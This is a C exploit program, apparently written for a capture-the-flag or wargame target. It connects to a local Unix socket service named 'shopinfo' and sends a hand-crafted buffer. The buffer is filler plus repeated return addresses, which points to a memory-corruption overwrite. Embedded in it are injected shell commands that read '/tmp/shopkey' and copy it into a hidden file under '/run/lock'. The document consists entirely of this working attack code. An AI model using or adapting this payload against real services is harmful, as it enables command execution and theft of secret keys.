
    #include <sys/types.h>  
    #include <sys/socket.h>  
    #include <sys/un.h>  
    #include <unistd.h>  
    #include <stdlib.h>  
    #include <stdio.h>  
      
    int main()  
    {  
	
      /* create a socket */  
      int sockfd = socket(AF_UNIX, SOCK_STREAM, 0);  
        
      struct sockaddr_un address;  
      address.sun_family = AF_UNIX;  
      strcpy(address.sun_path, "/home/wangyanfeng/shopinfo/si-socket");  
        
      /* connect to the server */  
      int result = connect(sockfd, (struct sockaddr *)&address, sizeof(address));  
      if(result == -1)  
      {  
        perror("connect failed: ");  
        exit(1);  
      }  
        
      /* exchange data */  
      char ch[] ="\x5C\x00\x00\x00\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f\x73\x68\x6f\x70\x6b\x65\x79\x00\x00\x00\x00\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\xa0\xb0\x04\x08XXXX";  
     char ch2[] ="\x5C\x00\x00\x00\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x01\x62\x63\x3b\x65\x63\x68\x6f\x20\x60\x63\x61\x74\x20\x2f\x74\x6d\x70\x2f\x73\x68\x6f\x70\x6b\x65\x79\x60\x20\x3e\x20\x2f\x72\x75\x6e\x2f\x6c\x6f\x63\x6b\x2f\x2e\x7a\x72\x33\x33\x00\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\x27\x8D\x04\x08\xa0\xb0\x04\x08XXXX";
	getchar();
      write(sockfd, &ch2, 0x60);
      read(sockfd, ch, 1024);  
      printf("%s\n", ch);  
        
      /* close the socket */  
      close(sockfd);  
        
      return 0;  
    }  
